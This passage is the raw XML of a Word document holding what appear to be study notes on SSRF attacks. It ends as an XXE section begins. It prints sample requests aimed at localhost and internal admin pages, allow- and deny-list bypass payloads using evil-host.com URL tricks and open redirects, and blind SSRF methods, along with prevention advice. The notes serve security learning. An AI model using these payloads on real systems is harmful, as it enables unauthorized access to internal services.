        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Length: 118</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockApi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=http</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:/</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/localhost/admin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>This works for various reasons:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Access controls are not part of the A</w:t>
      </w:r>
      <w:r>
        <w:t>PI that is handling requests from the server itself.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Admin interface may be on a different port that is not </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>accessbile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> to the internet, but is available on localhost.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>SSRF attacks against other systems</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Attacks where the server makes a request against other</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> backend systems that are part of the application's private network.  This can be effective since these backend systems will have a weaker security posture as they are thought to be secure because of the network topology.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>POST /product/stock HTTP/1.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Conte</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>nt-Type: application/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Length: 118</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockApi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=http://192.168.0.68/admin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Circumvent SSRF protection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Deny-list input filters</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">If an application does not allow strings like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>localhost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>127.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be processed, use alternate repres</w:t>
      </w:r>
      <w:r>
        <w:t>entations:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>2130706433</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>017700000001</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>127.1</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Register a domain that resolves to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>127.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use URL encoding or case variation to bypass string matching.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Allow-list input filters</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">If an application only allows requests to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>safelisted</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> domains, they can </w:t>
      </w:r>
      <w:r>
        <w:t>sometimes be bypassed based on how URLs are parsed:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>https://evil-host.com#good-host.com # URL fragment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>https://good-host.com.evil-host.com # Subdomain parsing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">https://good-host.com@evil-host.com # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Userinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> parsing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>The above can be combined with URL encodi</w:t>
      </w:r>
      <w:r>
        <w:t>ng to help bypass filters.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Bypass via open redirects</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>If application contains an open redirect vulnerability, you can use it to bypass allow list filters:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>POST /product/stock HTTP/1.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Length: 118</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>stoc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>kApi=https://feedingfromthegardenuntilhistickerisjammed.com/product?id=42&amp;path=http://192.168.0.68/admin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Blind SSRF</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>When an attack succeeds and sends a request to a backend server, but does not send a response back to the attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Detect using an out-of-b</w:t>
      </w:r>
      <w:r>
        <w:t>and technique (OAST) where you send a request a server you control and monitoring for the SSRF request.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>:bulb</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>: It is common when testing for SSRF vulnerabilities to use a DNS lookup as the out-of-band technique.  This is because DNS lookups are usually per</w:t>
      </w:r>
      <w:r>
        <w:t>mitted from most networks.  You can then check if only the DNS lookup succeeds and there is no subsequent HTTP request.  This indicates there is network filtering blocking your SSRF attack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>To exploit blind SSRF vulnerabilities:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Send requests to the intern</w:t>
      </w:r>
      <w:r>
        <w:t>al IP address space with known vulnerability payloads.  You may get lucky and stumble upon an unpatched vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>It is also possible to have the HTTP request from an SSRF vulnerability return a malicious response in an attempt to gain control over th</w:t>
      </w:r>
      <w:r>
        <w:t>e system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Deny all outbound requests by default and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>safelist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> only what is required.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Safelist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> DNS lookups from your network to prevent OAST.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Safelist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> incoming requests to ensure they are to legitimate source.  As much as possible, use constants for </w:t>
      </w:r>
      <w:r>
        <w:t>the IP or URL so that it cannot be altered by an attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId38" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Intruder</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId39" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Repeater</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/ssrf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:sectPr w:rsidR="00B3581B">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/ssrf/blind</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">XML external entity (XXE) </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>injection :syringe</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Uses XML data processing by a server to execute attacks against a server.  Can allow an</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attacker to:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Read files on the server;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Compromise the server; or</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Execute SSRF attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Attacks occur when applications use XML to transmit data and do not disable potentially dangerous processing of XML entities.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>:bulb</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">: This type was more </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>prevelant</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> before</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> JSON became the dominant data transfer format, but it is still sometimes exploitable.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>XML refresher</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>XML entities</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: represent special characters in XML documents such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>&amp;amp</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
